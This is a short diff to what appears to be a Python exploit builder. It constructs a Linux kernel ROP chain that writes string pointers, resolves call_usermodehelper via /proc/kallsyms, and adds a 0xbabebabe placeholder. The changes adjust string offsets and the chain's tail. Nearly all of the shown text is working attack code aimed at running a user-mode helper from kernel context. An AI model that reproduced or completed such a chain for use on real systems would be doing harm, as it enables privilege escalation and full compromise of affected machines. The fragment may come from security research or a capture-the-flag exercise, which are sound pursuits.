@@ -153,9 +153,9 @@ def build(leak, gadget_file, sled_length, adjuster):
     rop = write4(rop, gadget_file, adjuster, string_location + 40,
             string_location)
     rop = write4(rop, gadget_file, adjuster, string_location + 48,
-            string_location + 11)
+            string_location + 10)
     rop = write4(rop, gadget_file, adjuster, string_location + 56,
-            string_location + 14)
+            string_location + 13)
     rop = write4(rop, gadget_file, adjuster, string_location + 64,
             0x0)
 
@@ -183,6 +183,8 @@ def build(leak, gadget_file, sled_length, adjuster):
     rop.raw(0x0)
     # Address of call_usermodehelper from /proc/kallsyms
     rop.raw(kallsyms_lookup_name('call_usermodehelper'))
+    # rop.raw(0x0)
+    rop.raw(0xbabebabe)
 
     # Display our completed ROP chain
     print(rop.dump())
